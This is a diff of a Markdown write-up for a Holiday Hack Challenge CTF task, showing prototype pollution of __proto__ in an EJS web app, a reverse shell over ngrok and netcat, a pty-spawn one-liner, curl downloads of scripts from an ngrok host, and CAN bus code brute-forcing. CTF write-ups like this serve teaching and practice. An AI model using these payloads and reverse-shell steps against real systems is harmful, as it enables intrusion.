@@ -226,11 +226,9 @@ From inspecting the HTML source code and Javascript code we find the following e
 
 #### Finding exploitable vector
 
-From the endpoints we see that there is just one endpoint taking any form of input, _/ctrlsignals_. We know from the hints that we are facing prototype poisoning, and this endpoint seems to fit the bill. 
+From the endpoints we see that there is just one endpoint taking any form of input, _/ctrlsignals_. We know from the hints that we are facing prototype poisoning, and this endpoint seems to fit the bill. So lets toy some further.
 
-##### Uncovering the template rendering engine
-
-By sending a single `'` we can make the system fail at parsing the input: 
+By sending a single _'_ we can make the system fail at parsing the input: 
 
 ```
 SyntaxError: Unexpected token ' in JSON at position 0    at JSON.parse (<anonymous>)    at /app/server.js:121:33    at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5)    at next (/app/node_modules/express/lib/router/route.js:149:13)    at Route.dispatch (/app/node_modules/express/lib/router/route.js:119:3)    at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5)    at /app/node_modules/express/lib/router/index.js:284:15    at Function.process_params (/app/node_modules/express/lib/router/index.js:346:12)    at next (/app/node_modules/express/lib/router/index.js:280:10)    at /app/server.js:49:9
@@ -238,9 +236,7 @@ SyntaxError: Unexpected token ' in JSON at position 0    at JSON.parse (<anony
 
 
 
-
-
-Provoking error message to confirm `__proto__` vulnerability in EJS templating system;
+Provoking error message to confirm _\_\_proto\_\__ vulnerability in EJS templating system;
 
 ```BASH
 https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/ctrlsignals?message={"action":"update","key":"__proto__","subkey":"toString","value":"a"}
@@ -303,68 +299,16 @@ escapeFn is not a function
     at ServerResponse.render (/app/node_modules/express/lib/response.js:1049:7)
 ```
 
-Endpoint has an error that gives away an flaw in Json.parse
+#### Web application
 
-```html
-<!DOCTYPE html>
-<html lang="en">
-<head>
-<meta charset="utf-8">
-<title>Error</title>
-</head>
-<body>
-<pre>SyntaxError: Unexpected token _ in JSON at position 0<br> &nbsp; &nbsp;at JSON.parse (&lt;anonymous&gt;)<br> &nbsp; &nbsp;at /app/server.js:121:33<br> &nbsp; &nbsp;at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5)<br> &nbsp; &nbsp;at next (/app/node_modules/express/lib/router/route.js:149:13)<br> &nbsp; &nbsp;at Route.dispatch (/app/node_modules/express/lib/router/route.js:119:3)<br> &nbsp; &nbsp;at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5)<br> &nbsp; &nbsp;at /app/node_modules/express/lib/router/index.js:284:15<br> &nbsp; &nbsp;at Function.process_params (/app/node_modules/express/lib/router/index.js:346:12)<br> &nbsp; &nbsp;at next (/app/node_modules/express/lib/router/index.js:280:10)<br> &nbsp; &nbsp;at /app/server.js:49:9</pre>
-</body>
-</html>
-```
+In order to craft a payload we turned to Python for development, as fiddling with the browser quickly became cumbersome. The following Python script is provided as is. It functions as thus: 
 
+1. Login to the control panel
+2. Trigger JSON parse error
+3. Stages the payload. In this (final) version it pollutes \_\_proto\_\_ with a piece of code that connects back to our reverse shell
+4. Triggers the reverse shell by visiting the /stats endpoint
 
-python3 -c 'import pty;pty.spawn("/bin/bash")'
-
-Remember to refresh the main page for the reverse shell to work!!!
-
-NOTE: SOLVE THIS USING EDGE!!!!
-
-curl -o test.py  https://scarabaeiform-prolixly-odin.ngrok-free.dev/test.sh
-curl -o cb.py  https://scarabaeiform-prolixly-odin.ngrok-free.dev/cb.py
-
-
-General workflow from start to finish:
-
-1. In the webapp, inspect all endpoint
-2. Find the endpoint where you can set data
-3. Provoke error messages to find the rendering engine (EJS)
-4. See if it is possible to set __proto__
-
-Enabling shell
-5. On endpoint set client = 1
-6. On endpoint set debug = 1
-7. Set up NGROK netcat reverse
-8. Plant payload for reverse shell using the NGROK address and port
-9. Refresh main page
-
-In spawned shell:
-10. Privilege escalate using python to get a fancy bash shell
-11. Inspect canbus_client.py
-12. Inspect README.md
-
-Identifying missing HEX code
-13. Set up NGROK web frontend
-14. Spin up Python webserver
-15. Serve HEX bruteforce python script
-16. Run bruteforce script whilst observing if the robot moves
-
-
-## Solution
-
-### Web application
-
-### Identifying control codes
-
-### Robot
-
-
-### Web application
+We found this to be a functional and fairly quick methodology to tackle the objective. The code:
 
 ```python
 import requests
@@ -454,7 +398,7 @@ stats_r = s.get(stats_panel_url)
 print(stats_r.text)
 ```
 
-Output: 
+We made the script output the URLs so we could copy them and paste them into our web browser to bring the reverse shell into our logged in session to steer the robot.
 
 ```
 ===========================================
@@ -490,6 +434,9 @@ Step 4. Stats page
 
 ... snip ...
 ```
+
+In the initial development phase of our payload we made it reach out to a webhook on the Internett, just to verify it working. Once that was done we simply changed over to using an Ngrok infrastucture with netcat shell. 
+
 #### Setup attack infrastructure
 
 In order to conduct this attack we had to set up the following infrastructure using Kali in WSL (in total four instances): 
@@ -706,3 +653,43 @@ This objective required extensive reading up on the whole `__proto__` attack vec
 | Once you determine the type of database the gnome control factory's login is using, look up its documentation on default document types and properties. This information could help you generate a list of common English first names to try in your attack. |
 | Oh no, it sounds like the CAN bus controls are not sending the correct signals! If only there was a way to hack into your gnome's control stats/signal container to get command-line access to the smart-gnome. This would allow you to fix the signals and control the bot to shut down the factory. During my development of the robotic prototype, we found the factory's pollution to be undesirable, which is why we shut it down. If not updated since then, the gnome might be running on old and outdated packages. |
 | Nice! Once you have command-line access to the gnome, you'll need to fix the signals in the canbus_client.py file so they match up correctly. After that, the signals you send through the web UI to the factory should properly control the smart-gnome. You could try sniffing CAN bus traffic, enumerating signals based on any documentation you find, or brute-forcing combinations until you discover the right signals to control the gnome from the web UI. |
+
+
+
+
+
+
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+
+Remember to refresh the main page for the reverse shell to work!!!
+
+NOTE: SOLVE THIS USING EDGE!!!!
+
+curl -o test.py  https://scarabaeiform-prolixly-odin.ngrok-free.dev/test.sh
+curl -o cb.py  https://scarabaeiform-prolixly-odin.ngrok-free.dev/cb.py
+
+
+General workflow from start to finish:
+
+1. In the webapp, inspect all endpoint
+2. Find the endpoint where you can set data
+3. Provoke error messages to find the rendering engine (EJS)
+4. See if it is possible to set __proto__
+
+Enabling shell
+5. On endpoint set client = 1
+6. On endpoint set debug = 1
+7. Set up NGROK netcat reverse
+8. Plant payload for reverse shell using the NGROK address and port
+9. Refresh main page
+
+In spawned shell:
+10. Privilege escalate using python to get a fancy bash shell
+11. Inspect canbus_client.py
+12. Inspect README.md
+
+Identifying missing HEX code
+13. Set up NGROK web frontend
+14. Spin up Python webserver
+15. Serve HEX bruteforce python script
+16. Run bruteforce script whilst observing if the robot moves
